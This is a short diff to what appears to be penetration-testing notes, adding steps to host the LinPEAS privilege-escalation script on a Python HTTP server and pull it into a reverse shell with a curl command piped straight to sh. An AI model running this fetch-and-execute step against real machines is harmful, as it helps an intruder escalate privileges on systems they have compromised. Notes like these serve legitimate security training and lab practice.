@@ -41,7 +41,14 @@ chmod +x [file_name].sh
 For more information, check out LinPEAS Github: https://github.com/carlospolop/PEASS-ng/
 ```
 
-
+Alternatively.. you can start spin up a python server by spinning up a Python server where your linPEAS file is stored:
+```
+python3 -m http.server
+```
+Then in your reverse shell, make a call back to your Python server user cURL:
+```
+curl -L http:/10.2.45.175/linpeas.sh | sh
+```
 
 ## Cracking
 ### Hydra
